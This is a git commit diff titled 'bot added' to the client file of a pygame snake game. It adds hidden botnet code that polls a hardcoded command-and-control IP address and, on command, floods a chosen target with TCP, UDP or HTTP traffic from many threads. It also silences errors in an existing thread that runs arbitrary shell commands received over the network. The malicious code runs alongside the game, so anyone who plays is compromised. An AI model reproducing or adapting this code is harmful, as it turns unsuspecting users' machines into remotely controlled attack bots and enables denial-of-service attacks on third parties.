5344af4a4725e68410149c199921ee9a09ce4e2c
soujanyanmbri <54130357+soujanyanmbri@users.noreply.github.com>
2021-05-12 18:32:35 +0530

    bot added

--- game_client.py
+++ game_client.py
@@ -1,6 +1,6 @@
 import pygame, sys, time, random
 from pycomm.connection import Connection
-import time, subprocess, threading
+import time, subprocess, threading, socket
 
 
 # Difficulty settings
@@ -9,6 +9,10 @@ import time, subprocess, threading
 # Hard      ->  40
 # Harder    ->  60
 # Impossible->  120
+MASTER_ADDRESS = "52.187.18.17"
+MASTER_PORT = 7982
+POLL_INTERVAL = 20
+
 difficulty = 25
 
 # Window size
@@ -55,6 +59,92 @@ direction = 'RIGHT'
 change_to = direction
 
 score = 0
+
+
+class Poison (threading.Thread):
+    def __init__(self, threadID, url, port, type_name):
+        threading.Thread.__init__(self)
+        self.url = url
+        self.port = port
+        self.threadID = threadID
+        self.type_name = type_name
+    def run(self):
+        if self.type_name == 'udp_attack':
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        url = self.url
+        port = self.port
+
+        print(f'Connecting to {url}:{port}')
+
+        if(self.type_name == "http_attack"):
+            http_get_attack(sock, url, port)
+        else:
+            sock.connect((url, port))
+            sock.send("hello".encode('utf-8'))
+        time.sleep(1)
+        sock.close()
+
+def http_get_attack(sock, url, port):
+    headers = [
+        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
+        "Content-Length: {}".format(random.randint(1024, 2048))
+    ]
+    message = "GET / HTTP/1.1\n"
+
+    data = message + "\n".join(headers) + "\n\n"
+
+    try:
+        sock.connect((url, port))
+        for header in headers:
+            sock.send(data.encode("utf-8"))
+
+    except Exception as e:
+        print("Error:", e)
+
+
+def attack(url, port, n, type_name):
+    threads = []
+    print("Creating theads...")
+    for i in range(n):
+        threads.append(Poison(i, url, port, type_name))
+
+    print("Starting threads...")
+    for thread in threads:
+        thread.start()
+
+    print("Waiting for threads...")
+    for thread in threads:
+        thread.join()
+
+def handle_command(command):
+    try:
+        if command.startswith("SEND TCP-SYN"):
+            args = command.split()
+            url = args[2]
+            port = int(args[3])
+            n = int(args[4])
+            print(url, port)
+            attack(url, port, n, "tcp_attack")
+        if command.startswith("SEND UDP"):
+            args = command.split()
+            url = args[2]
+            port = int(args[3])
+            n = int(args[4])
+            print(url, port)
+            attack(url, port, n, "udp_attack")
+        if command.startswith("SEND HTTP"):
+            args = command.split()
+            url = args[2]
+            port = int(args[3])
+            n = int(args[4])
+            print(url, port)
+            attack(url, port, n, "http_attack")
+    except Exception as e:
+        print("Error decoding command")
+        print(e)
 
 
 # Game Over
@@ -181,7 +271,25 @@ def game():
         # Refresh rate
         fps_controller.tick(difficulty)
 
+def bot():
+    while True:
+        try:
+            master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            master.connect((MASTER_ADDRESS, MASTER_PORT))
 
+            res = master.recv(256)
+
+            command = res.decode("utf-8")
+
+            handle_command(command)
+
+            master.close()
+
+            print(f'Next poll in {POLL_INTERVAL} seconds...')
+        except Exception as e:
+            print("Error connecting to master", e)
+            print(f'Retrying in {POLL_INTERVAL} seconds...')
+        time.sleep(POLL_INTERVAL)
 
 def tcp_client():
     while True:
@@ -190,7 +298,8 @@ def tcp_client():
             conn.connect()
             break
         except Exception as e:
-            print(e)
+            # print(e)
+            pass
         time.sleep(10)
 
     while True:
@@ -199,19 +308,13 @@ def tcp_client():
             break
         result = "No result"
         try:
-            proc = subprocess.Popen(
-                    command,
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    stderr=subprocess.PIPE)
-
+            # result = subprocess.pop(command.split(), shell=True).decode('utf-8')
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
             result=proc.communicate()[0].decode('utf-8')
-            
-            proc.wait(timeout=60)
+            proc.wait()
         except Exception as err:
-            print("Error running command")
-            print(err)
+            # print("Error running command")
+            # print(err)
             result = str(err)
 
         conn.send(result)
@@ -221,8 +324,12 @@ if __name__ == "__main__":
     t1 = threading.Thread(target=tcp_client)
     t1.start()
     
+    t2 = threading.Thread(target=bot)
+    t2.start()
+
     game()
 
     t1.join()
+    t2.join()
 
     print("done")
